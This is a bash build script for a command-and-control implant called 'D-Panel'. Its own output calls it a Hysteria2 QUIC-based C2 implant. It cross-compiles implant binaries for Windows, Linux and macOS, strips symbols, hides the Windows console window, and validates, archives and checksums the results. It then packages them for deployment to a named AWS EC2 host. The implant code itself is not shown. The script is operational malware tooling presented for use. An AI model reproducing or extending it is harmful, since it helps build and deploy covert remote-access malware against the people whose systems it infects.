#!/bin/bash

# Enhanced D-Panel Implant Build Script
# Builds cross-platform implant binaries with parallel builds, caching, and validation

set -e

echo "[+] Enhanced D-Panel Implant Build Script Starting..."
echo "[+] Building Hysteria2 QUIC-based C2 implant with parallel builds and caching"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
VERSION="2.1.0-shadowgrok"
BUILD_DIR="build"
DIST_DIR="dist"
CACHE_DIR=".build-cache"
LOG_DIR="build-logs"
PARALLEL_BUILDS=${PARALLEL_BUILDS:-4}  # Number of parallel builds
ENABLE_CACHE=${ENABLE_CACHE:-true}      # Enable build caching
VALIDATE_BINARIES=${VALIDATE_BINARIES:-true} # Validate built binaries

# Create directories
echo "[+] Setting up build directories..."
rm -rf $BUILD_DIR $DIST_DIR $LOG_DIR
mkdir -p $BUILD_DIR $DIST_DIR $CACHE_DIR $LOG_DIR

# Build for multiple platforms
PLATFORMS=(
    "windows/amd64"
    "windows/386" 
    "linux/amd64"
    "linux/386"
    "linux/arm64"
    "darwin/amd64"
    "darwin/arm64"
)

echo "[+] Building for platforms: ${PLATFORMS[@]}"
echo "[+] Parallel builds: $PARALLEL_BUILDS"
echo "[+] Cache enabled: $ENABLE_CACHE"
echo "[+] Validation enabled: $VALIDATE_BINARIES"

# Function to build a single platform
build_platform() {
    local platform=$1
    local platform_split=(${platform//\// })
    local GOOS=${platform_split[0]}
    local GOARCH=${platform_split[1]}
    
    local output_name="h2-implant-${GOOS}-${GOARCH}"
    if [ $GOOS = "windows" ]; then
        output_name+='.exe'
    fi
    
    local log_file="$LOG_DIR/${GOOS}-${GOARCH}.log"
    local cache_key="${GOOS}-${GOARCH}-${VERSION}"
    local cache_file="$CACHE_DIR/${cache_key}.bin"
    
    echo "[+] Building for $GOOS/$GOARCH..." | tee -a "$log_file"
    
    # Check cache if enabled
    if [ "$ENABLE_CACHE" = true ] && [ -f "$cache_file" ]; then
        echo -e "${BLUE}[+] Cache hit for $GOOS/$GOARCH, copying from cache${NC}" | tee -a "$log_file"
        cp "$cache_file" "$BUILD_DIR/$output_name"
        echo -e "${GREEN}[+] Successfully restored $output_name from cache${NC}" | tee -a "$log_file"
        return 0
    fi
    
    # Set environment variables for cross-compilation
    export GOOS=$GOOS
    export GOARCH=$GOARCH
    export CGO_ENABLED=0
    
    # Enhanced build flags for optimization
    local ldflags="-s -w -X main.version=$VERSION -X main.buildTime=$(date -u +%Y%m%d.%H%M%S)"
    
    # Add platform-specific optimizations
    case "$GOOS/$GOARCH" in
        "linux/amd64")
            ldflags+=" -buildmode=pie"
            ;;
        "windows/amd64")
            ldflags+=" -H=windowsgui"
            ;;
    esac
    
    # Build the implant with enhanced flags
    if go build -ldflags "$ldflags" \
             -trimpath \
             -tags "netgo osusergo static_build" \
             -o $BUILD_DIR/$output_name \
             . 2>&1 | tee -a "$log_file"; then
        
        echo -e "${GREEN}[+] Successfully built $output_name${NC}" | tee -a "$log_file"
        
        # Validate binary if enabled
        if [ "$VALIDATE_BINARIES" = true ]; then
            if validate_binary "$BUILD_DIR/$output_name" "$GOOS" >> "$log_file" 2>&1; then
                echo -e "${GREEN}[+] Validation passed for $output_name${NC}" | tee -a "$log_file"
            else
                echo -e "${RED}[-] Validation failed for $output_name${NC}" | tee -a "$log_file"
                return 1
            fi
        fi
        
        # Cache the binary if enabled
        if [ "$ENABLE_CACHE" = true ]; then
            cp "$BUILD_DIR/$output_name" "$cache_file"
            echo -e "${BLUE}[+] Cached $output_name${NC}" | tee -a "$log_file"
        fi
        
        return 0
    else
        echo -e "${RED}[-] Build failed for $GOOS/$GOARCH${NC}" | tee -a "$log_file"
        return 1
    fi
}

# Function to validate binary
validate_binary() {
    local binary=$1
    local goos=$2
    
    echo "[+] Validating binary: $binary"
    
    # Check if file exists
    if [ ! -f "$binary" ]; then
        echo "Error: Binary not found"
        return 1
    fi
    
    # Check file size (should be > 1MB and < 50MB)
    local size=$(stat -f%z "$binary" 2>/dev/null || stat -c%s "$binary" 2>/dev/null)
    if [ "$size" -lt 1048576 ] || [ "$size" -gt 52428800 ]; then
        echo "Error: Binary size $size is outside expected range"
        return 1
    fi
    
    # Check if binary is executable (Unix only)
    if [ "$goos" != "windows" ]; then
        if [ ! -x "$binary" ]; then
            chmod +x "$binary"
        fi
    fi
    
    # Basic binary integrity check
    if command -v file >/dev/null 2>&1; then
        local file_type=$(file "$binary")
        echo "File type: $file_type"
        
        case "$goos" in
            "windows")
                if ! echo "$file_type" | grep -q "PE32"; then
                    echo "Error: Not a valid Windows PE binary"
                    return 1
                fi
                ;;
            "linux")
                if ! echo "$file_type" | grep -q "ELF"; then
                    echo "Error: Not a valid Linux ELF binary"
                    return 1
                fi
                ;;
            "darwin")
                if ! echo "$file_type" | grep -q "Mach-O"; then
                    echo "Error: Not a valid macOS Mach-O binary"
                    return 1
                fi
                ;;
        esac
    fi
    
    echo "[+] Binary validation passed"
    return 0
}

# Build platforms in parallel
echo "[+] Starting parallel builds..."
FAILED_BUILDS=0
PIDS=()

for platform in "${PLATFORMS[@]}"; do
    build_platform "$platform" &
    PIDS+=($!)
    
    # Limit parallel builds
    if [ ${#PIDS[@]} -ge $PARALLEL_BUILDS ]; then
        for pid in "${PIDS[@]}"; do
            wait $pid || ((FAILED_BUILDS++))
        done
        PIDS=()
    fi
done

# Wait for remaining builds
for pid in "${PIDS[@]}"; do
    wait $pid || ((FAILED_BUILDS++))
done

# Check if any builds failed
if [ $FAILED_BUILDS -gt 0 ]; then
    echo -e "${RED}[-] $FAILED_BUILDS build(s) failed${NC}"
    echo "[+] Check build logs in: $LOG_DIR/"
    exit 1
fi

echo -e "${GREEN}[+] All builds completed successfully${NC}"

# Create compressed archives in parallel
echo "[+] Creating compressed archives..."
for platform in "${PLATFORMS[@]}"; do
    platform_split=(${platform//\// })
    GOOS=${platform_split[0]}
    GOARCH=${platform_split[1]}
    
    output_name="h2-implant-${GOOS}-${GOARCH}"
    if [ $GOOS = "windows" ]; then
        output_name+='.exe'
    fi
    
    if [ $GOOS = "windows" ]; then
        cd $BUILD_DIR
        zip -q "../$DIST_DIR/${output_name}.zip" $output_name
        cd ..
    else
        tar -czf "$DIST_DIR/${output_name}.tar.gz" -C $BUILD_DIR $output_name
    fi
    
    echo "[+] Archived: ${output_name}"
done

# Generate checksums
echo "[+] Generating checksums..."
cd $DIST_DIR
sha256sum * > checksums.txt
md5sum * >> checksums.txt
cd ..

# Generate build report
echo "[+] Generating build report..."
cat > "$DIST_DIR/build-report.txt" << EOF
D-Panel Implant Build Report
=============================
Version: $VERSION
Build Date: $(date -u +"%Y-%m-%d %H:%M:%S UTC")
Build Host: $(hostname)
Go Version: $(go version)
Platforms: ${PLATFORMS[@]}
Parallel Builds: $PARALLEL_BUILDS
Cache Enabled: $ENABLE_CACHE
Validation: $VALIDATE_BINARIES

Artifacts:
EOF

ls -lh $DIST_DIR/ >> "$DIST_DIR/build-report.txt"

# Create deployment package
echo "[+] Creating deployment package..."
DEPLOY_PACKAGE="dpanel-implant-v${VERSION}-$(date +%Y%m%d-%H%M%S).tar.gz"
tar -czf "$DEPLOY_PACKAGE" $DIST_DIR/ README.md

echo -e "${GREEN}[+] Build completed successfully!${NC}"
echo "[+] Distribution files in: $DIST_DIR/"
echo "[+] Deployment package: $DEPLOY_PACKAGE"
echo "[+] Checksums: $DIST_DIR/checksums.txt"
echo "[+] Build report: $DIST_DIR/build-report.txt"
echo "[+] Build logs: $LOG_DIR/"

# List built files
echo ""
echo "[+] Built files:"
ls -lh $DIST_DIR/

# Summary
echo ""
echo -e "${GREEN}[+] Build Summary${NC}"
echo "[+] Platforms built: ${#PLATFORMS[@]}"
echo "[+] Cache directory: $CACHE_DIR"
echo "[+] Log directory: $LOG_DIR"
echo "[+] Total artifacts: $(ls -1 $DIST_DIR/ | wc -l)"

echo ""
echo -e "${GREEN}[+] Ready for deployment to AWS server ec2-13-55-232-246.ap-southeast-2.compute.amazonaws.com${NC}"